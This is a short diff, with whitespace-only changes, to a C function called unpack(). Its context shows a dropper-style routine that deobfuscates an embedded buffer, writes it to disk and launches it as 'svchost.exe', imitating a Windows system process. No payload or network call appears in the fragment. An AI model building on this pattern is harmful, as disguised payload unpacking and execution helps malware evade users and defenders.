@@ -28,7 +28,7 @@ int unpack()
 
 	if (size == 0)
 		return GetLastError();
-	
+
 #ifdef OBFUSCATE
 	base = deobfuscate(base, size, (SIZE_T)REAL_SIZE);
 	if (base == NULL)
@@ -46,7 +46,7 @@ int unpack()
 	DWORD written = 0;
 	BOOL write_ok = WriteFile(file, base, size, &written, NULL);
 	CloseHandle(file);
-	
+
 	if (!write_ok)
 		return GetLastError();
 
@@ -56,11 +56,11 @@ int unpack()
 #endif
 
 	STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+	PROCESS_INFORMATION pi;
 
-    ZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-    ZeroMemory(&pi, sizeof(pi));
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
 
 	if (CreateProcess("svchost.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL,
 			  &si, &pi) == 0)
